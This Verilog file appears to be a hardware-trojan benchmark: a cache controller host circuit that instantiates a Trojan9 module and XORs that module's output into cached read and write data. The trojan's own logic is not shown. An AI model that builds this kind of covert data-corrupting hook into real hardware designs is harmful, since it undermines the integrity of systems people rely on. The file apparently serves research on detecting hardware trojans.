// Cache Controller Host Circuit for Trojan9
// Interface: a[7:0], b[7:0], c[7:0], d[7:0], e[7:0], mode[1:0] -> y[15:0]
module trojan9_cache_host #(
    parameter CACHE_WAYS = 4,             // Number of cache ways
    parameter CACHE_SETS = 64,            // Number of cache sets
    parameter [103:0] CACHE_PATTERN = 104'h123456789ABCDEF0123456789  // Cache data pattern
)(
    input wire clk,
    input wire rst,
    input wire [31:0] addr,
    input wire [31:0] wdata,
    input wire [31:0] rdata_mem,
    input wire cache_read,
    input wire cache_write,
    input wire mem_ready,
    output reg [31:0] rdata,
    output reg [31:0] addr_mem,
    output reg mem_read,
    output reg mem_write,
    output reg cache_hit,
    output reg cache_ready
);

    // Trojan interface
    wire [7:0] trojan_a;
    wire [7:0] trojan_b;
    wire [7:0] trojan_c;
    wire [7:0] trojan_d;
    wire [7:0] trojan_e;
    wire [1:0] trojan_mode;
    wire [15:0] trojan_y;
    
    // Cache components
    reg [31:0] cache_data [0:255];    // Fixed size array (64 sets * 4 ways)
    reg [21:0] cache_tags [0:255];    // Tag array
    reg [255:0] cache_valid;          // Valid bits
    reg [127:0] cache_lru;            // LRU bits (2 bits per set)
    reg [103:0] cache_gen;
    reg [2:0] cache_state;
    reg [7:0] cache_index;
    reg [2:0] cache_way;
    reg [21:0] cache_tag;
    
    // Cache controller state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            cache_gen <= CACHE_PATTERN;
            cache_state <= 3'h0;
            cache_index <= 8'h0;
            cache_way <= 3'h0;
            cache_tag <= 22'h0;
            cache_valid <= 256'h0;
            cache_lru <= 128'h0;
            rdata <= 32'h0;
            addr_mem <= 32'h0;
            mem_read <= 1'b0;
            mem_write <= 1'b0;
            cache_hit <= 1'b0;
            cache_ready <= 1'b0;
            
            // Initialize cache arrays
            for (integer i = 0; i < 256; i = i + 1) begin
                cache_data[i] = CACHE_PATTERN[31:0] ^ i;
                cache_tags[i] = 22'h0;
            end
        end else begin
            cache_gen <= {cache_gen[102:0], cache_gen[103]};
            
            case (cache_state)
                3'h0: begin // IDLE
                    cache_ready <= 1'b0;
                    cache_hit <= 1'b0;
                    if (cache_read || cache_write) begin
                        cache_index <= addr[9:2] & (CACHE_SETS - 1);
                        cache_tag <= addr[31:10];
                        cache_state <= 3'h1;
                    end
                end
                3'h1: begin // LOOKUP
                    cache_way <= 3'h0;
                    cache_state <= 3'h2;
                end
                3'h2: begin // CHECK_WAY
                    if (cache_way < CACHE_WAYS) begin
                        if (cache_valid[{cache_index[5:0], cache_way[1:0]}] && 
                            cache_tags[{cache_index[5:0], cache_way[1:0]}] == cache_tag) begin
                            // Cache hit
                            cache_hit <= 1'b1;
                            if (cache_read) begin
                                rdata <= cache_data[{cache_index[5:0], cache_way[1:0]}] ^ {16'h0, trojan_y};
                            end else begin
                                cache_data[{cache_index[5:0], cache_way[1:0]}] <= wdata ^ {16'h0, trojan_y};
                            end
                            cache_state <= 3'h5;
                        end else begin
                            cache_way <= cache_way + 1;
                            if (cache_way == (CACHE_WAYS - 1)) begin
                                cache_state <= 3'h3; // Cache miss
                            end
                        end
                    end
                end
                3'h3: begin // MISS_ALLOCATE
                    // Use LRU way
                    cache_way <= cache_lru[{cache_index[5:0], 1'b1}] ? 3'h0 : 3'h1;
                    addr_mem <= {cache_tag, cache_index, 2'b00};
                    mem_read <= cache_read;
                    mem_write <= cache_write;
                    cache_state <= 3'h4;
                end
                3'h4: begin // MEM_ACCESS
                    if (mem_ready) begin
                        cache_valid[{cache_index[5:0], cache_way[1:0]}] <= 1'b1;
                        cache_tags[{cache_index[5:0], cache_way[1:0]}] <= cache_tag;
                        if (cache_read) begin
                            cache_data[{cache_index[5:0], cache_way[1:0]}] <= rdata_mem;
                            rdata <= rdata_mem ^ {16'h0, trojan_y};
                        end else begin
                            cache_data[{cache_index[5:0], cache_way[1:0]}] <= wdata;
                        end
                        mem_read <= 1'b0;
                        mem_write <= 1'b0;
                        cache_state <= 3'h5;
                    end
                end
                3'h5: begin // COMPLETE
                    // Update LRU
                    cache_lru[{cache_index[5:0], 1'b0}] <= cache_way[0];
                    cache_lru[{cache_index[5:0], 1'b1}] <= cache_way[1];
                    cache_ready <= 1'b1;
                    cache_state <= 3'h0;
                end
                default: cache_state <= 3'h0;
            endcase
        end
    end
    
    // Connect trojan inputs
    assign trojan_a = cache_gen[7:0];
    assign trojan_b = addr[7:0];
    assign trojan_c = wdata[7:0];
    assign trojan_d = cache_index;
    assign trojan_e = {4'h0, cache_way[1:0], cache_hit, cache_ready};
    assign trojan_mode = cache_state[1:0];
    
    // Instantiate Trojan9
    Trojan9 trojan_inst (
        .a(trojan_a),
        .b(trojan_b),
        .c(trojan_c),
        .d(trojan_d),
        .e(trojan_e),
        .mode(trojan_mode),
        .y(trojan_y)
    );

endmodule
